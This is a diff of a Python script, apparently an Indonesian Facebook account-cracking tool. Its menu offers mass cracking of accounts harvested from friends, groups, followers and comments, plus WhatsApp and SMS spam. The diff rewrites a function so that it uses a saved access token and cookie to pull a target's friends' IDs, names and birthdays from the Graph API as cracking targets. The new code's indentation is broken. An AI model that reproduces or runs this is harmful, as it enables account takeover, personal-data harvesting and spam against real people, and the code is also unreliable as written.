@@ -334,7 +334,7 @@ def menu(my_name,my_id):
 	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Country  : [bold green]{negara}[/]\n[bold white][+[/][bold white]][/] [bold white]City     : [bold green]{kota}[/]\n[bold white][+[/][bold white]][/] [bold white]Region   : [bold green]{region}[/][/]\n[bold white][+[/][bold white]][/] [bold white]TimeZone : [bold green]{times}[/][/]\n[bold white][+[/][bold white]][/] [bold white]My Ip    : [bold green]{ip}[/][/] ',width=43,padding=(0,3),style=f"bold white"))
 	console.print(Columns(dia))
 	cetak(panel(f"[bold white]Alvino_Xy , DerrXr , Asepit-Gans , Rozhak XD , Rochmat Basuki , Nazri XD , Aorec XD , Lukman-XD , Dapunta , Kall",width=90,title=f"[bold green]Thanks To",style=f"bold white"))
-	cetak(panel(f"[bold white][[bold cyan]01[bold white]] Crack From Friends     [bold white][[bold cyan]06[bold white]] Crack From Username[bold white]      [[bold cyan]11[bold white]] Get Headers      \n[bold white][[bold cyan]02[bold white]] Crack From Massal      [bold white][[bold cyan]07[bold white]] Crack From Followers     [[bold cyan]12[bold white]] Spam WhatsApp      \n[bold white][[bold cyan]03[bold white]] Crack From Groups      [[bold cyan]08[bold white]] Crack From Comment       [bold white][[bold cyan]13[bold white]] Spam Sms \n[bold white][[bold cyan]04[bold white]] Crack From Email       [bold white][[bold cyan]09[bold white]] Check Opsi Checkpoint [bold white]   [[bold cyan]14[bold white]] Dump Id \n[bold white][[bold cyan]05[bold white]] Crack From Files       [bold white][[bold cyan]10[bold white]] [bold white]Check Result Crack [bold white]      [[bold cyan]15[bold white]] [bold red]Delete Cookies",width=90,title=f"[bold green]List Menu",style=f"bold white"))
+	cetak(panel(f"[bold red][[bold cyan]01[bold red]] Crack From Friends(Rusak)     [bold white][[bold cyan]06[bold white]] Crack From Username[bold white]      [[bold cyan]11[bold white]] Get Headers      \n[bold white][[bold cyan]02[bold white]] Crack From Massal      [bold white][[bold cyan]07[bold white]] Crack From Followers     [[bold cyan]12[bold white]] Spam WhatsApp      \n[bold white][[bold cyan]03[bold white]] Crack From Groups      [[bold cyan]08[bold white]] Crack From Comment       [bold white][[bold cyan]13[bold white]] Spam Sms \n[bold white][[bold cyan]04[bold white]] Crack From Email       [bold white][[bold cyan]09[bold white]] Check Opsi Checkpoint [bold white]   [[bold cyan]14[bold white]] Dump Id \n[bold white][[bold cyan]05[bold white]] Crack From Files       [bold white][[bold cyan]10[bold white]] [bold white]Check Result Crack [bold white]      [[bold cyan]15[bold white]] [bold red]Delete Cookies",width=90,title=f"[bold green]List Menu",style=f"bold white"))
 	_____brayennn___xd____ = input(f' [+] Pilih Menu Crack : ')
 	if _____brayennn___xd____ in ['1','01']:
 		brayen_dump()
@@ -758,51 +758,20 @@ def brayen_dump():
 		exit()
 #-------------------[ CRACK-PUBLIK ]----------------#
 def dump_massal():
-	try:
-		token = open('.token.txt','r').read()
+	token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
-	except IOError:
-		exit()
-	try:
-		cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]Crack Massal",style=f"bold white"))
-		jum = int(input(f' [+] Mau Berapa Idz Target  : '))
-	except ValueError:
-		print(' [+] Wrong input ')
-		exit()
-	if jum<1 or jum>80:
-		print(f' [+] Pertemanan Tidak Publik  ')
-		exit()
-	ses=requests.Session()
-	yz = 0
-	for met in range(jum):
-		yz+=1
-		kl = input(f' [+] Masukan Idz Target Yang Ke '+str(yz)+' : ')
-		uid.append(kl)
-	for userr in uid:
+		a = input('>> 🤙masukan id target: ')
 		try:
-			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
-			for mi in col['friends']['data']:
-				try:
-					iso = (mi['id']+'|'+mi['name'])
-					if iso in id:pass
-					else:id.append(iso)
-				except:continue
-		except (KeyError,IOError):
-			pass
-		except requests.exceptions.ConnectionError:
-			print(' [+] Unstable Signal ')
-			exit()
-	try:
-		print(f' [+] Total Idz Target Yang Terkumpul : {h}'+str(len(id)))
-		setting()
-	except requests.exceptions.ConnectionError:
-		print(f'')
-		print(' [+] Unstable Signal ')
-		exit()
-	except (KeyError,IOError):
-		print(f' [+] Pertemanan Tidak Public ')
-		time.sleep(3)
-		exit()
+			params = {
+			"access_token": token, 
+			"fields": "name,friends.fields(id,name,birthday)"
+			}
+			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
+			for c in b["friends"]["data"]:
+				id.append(c["id"]+"|"+c["name"])
+			print('>> Total Idz : {}'.format(len(id)));setting()
+		except Exception as e:
+			print(e)
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
 	cetak(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Crack Idz Old Ke New [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Crack Idz New Ke Old [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Crack Idz Random [[bold green]Very Recommended[bold white]][/]',width=90,padding=(0,8),title=f"[bold green]Setting Urutan Idz",style=f"bold white"))
